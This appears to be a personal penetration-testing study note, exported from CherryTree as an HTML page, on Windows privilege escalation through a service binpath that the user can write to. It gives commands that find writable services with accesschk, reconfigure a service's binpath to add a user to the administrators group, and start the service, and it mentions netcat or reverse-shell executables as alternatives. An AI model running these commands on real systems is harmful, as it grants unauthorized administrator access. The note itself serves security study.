@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>Insecure Service Properties (Writeable BinPath)</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>Insecure Service Properties (Writeable BinPath)</h1><br/>Writable BinPaths<br />	If you can write to the binpath of a service, you can change what it actually executes. (either an NC command, rev shell, or add a user to a group) <br />	.\accesschk64.exe /accepteula -uwcqv MyUsername NameOfService    (This will find if you can write to any binpaths)<br />	<br />	sc qc NameOfService		(Current config)	<br />	sc query NameOfService	(Status)<br />	sc config daclsvc binpath= &quot;net localgroup administrators MyUser /add&quot; (You can also point this to a revshell executable)<br />	sc start NameOfService</div></body></html>
